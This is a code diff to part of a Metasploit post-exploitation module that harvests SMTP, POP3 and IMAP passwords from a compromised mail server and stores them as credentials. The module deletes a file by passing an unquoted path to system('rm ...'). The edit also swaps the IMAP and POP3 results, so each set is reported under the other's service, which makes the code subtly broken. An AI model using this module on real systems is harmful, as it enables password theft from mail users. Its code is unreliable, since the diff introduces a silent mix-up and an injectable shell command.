@@ -159,7 +159,8 @@ class MetasploitModule < Msf::Post
     del_cmd = 'rm '
     del_cmd << data
     system(del_cmd)
-    return creds, imap, pop3
+    result = [creds, imap, pop3]
+    return result
   end
 
   def report_cred(creds)
@@ -170,30 +171,28 @@ class MetasploitModule < Msf::Post
       port: 25,
       service_name: 'smtp',
       protocol: 'tcp',
+      workspace_id: myworkspace_id
     }
     # Iterate through credentials
     creds.each do |cred|
       # Build credential information
       credential_data = {
-        origin_type: :service,
+        origin_type: :session,
         session_id: session_db_id,
         post_reference_name: self.refname,
         private_type: :password,
         private_data: cred[4],
         username: cred[1],
-        workspace_id: myworkspace_id,
         module_fullname: self.fullname
       }
-      print_status("Debug 1: #{credential_data}")
       credential_data.merge!(service_data)
-      print_status("Debug 2: #{credential_data}")
       credential_core = create_credential(credential_data)
 
       # Assemble the options hash for creating the Metasploit::Credential::Login object
       login_data = {
         core: credential_core,
         status: Metasploit::Model::Login::Status::UNTRIED,
-        workspace_id: myworkspace_id
+        # workspace_id: myworkspace_id
       }
 
       login_data.merge!(service_data)
@@ -208,7 +207,7 @@ class MetasploitModule < Msf::Post
     print_status("SMPT credentials saved in: #{loot_path}")
   end
 
-  def report_pop3(pop3)
+  def report_pop3(creds)
     # Build service information
     service_data = {
       # address: session.session_host, # Gives internal IP
@@ -216,30 +215,28 @@ class MetasploitModule < Msf::Post
       port: 110,
       service_name: 'pop3',
       protocol: 'tcp',
+      workspace_id: myworkspace_id
     }
     # Iterate through credentials
-    pop3.each do |cred|
+    creds.each do |cred|
       # Build credential information
       credential_data = {
-        origin_type: :service,
+        origin_type: :session,
         session_id: session_db_id,
         post_reference_name: self.refname,
         private_type: :password,
         private_data: cred[4],
         username: cred[1],
-        workspace_id: myworkspace_id,
         module_fullname: self.fullname
       }
-      vprint_status("Debug 1: #{credential_data}")
       credential_data.merge!(service_data)
-      vprint_status("Debug 2: #{credential_data}")
       credential_core = create_credential(credential_data)
 
       # Assemble the options hash for creating the Metasploit::Credential::Login object
       login_data = {
         core: credential_core,
         status: Metasploit::Model::Login::Status::UNTRIED,
-        workspace_id: myworkspace_id
+        # workspace_id: myworkspace_id
       }
 
       login_data.merge!(service_data)
@@ -254,7 +251,7 @@ class MetasploitModule < Msf::Post
     print_status("POP3 credentials saved in: #{loot_path}")
   end
 
-  def report_imap(imap)
+  def report_imap(creds)
     # Build service information
     service_data = {
       # address: session.session_host, # Gives internal IP
@@ -262,23 +259,21 @@ class MetasploitModule < Msf::Post
       port: 143,
       service_name: 'imap',
       protocol: 'tcp',
+      workspace_id: myworkspace_id
     }
     # Iterate through credentials
-    imap.each do |cred|
+    creds.each do |cred|
       # Build credential information
       credential_data = {
-        origin_type: :service,
+        origin_type: :session,
         session_id: session_db_id,
         post_reference_name: self.refname,
         private_type: :password,
         private_data: cred[4],
         username: cred[1],
-        workspace_id: myworkspace_id,
         module_fullname: self.fullname
       }
-      vprint_status("Debug 1: #{credential_data}")
       credential_data.merge!(service_data)
-      vprint_status("Debug 2: #{credential_data}")
       credential_core = create_credential(credential_data)
 
       # Assemble the options hash for creating the Metasploit::Credential::Login object
@@ -312,10 +307,9 @@ class MetasploitModule < Msf::Post
         'Mail Dir',
         'Password'
       ])
-    creds, imap, pop3 = parse_userlist(userlist)
-    report_cred(creds)
-    report_pop3(pop3)
-    report_imap(imap)
-
+    result = parse_userlist(userlist)
+    report_cred(result[0])
+    report_pop3(result[1])
+    report_imap(result[2])
   end
 end
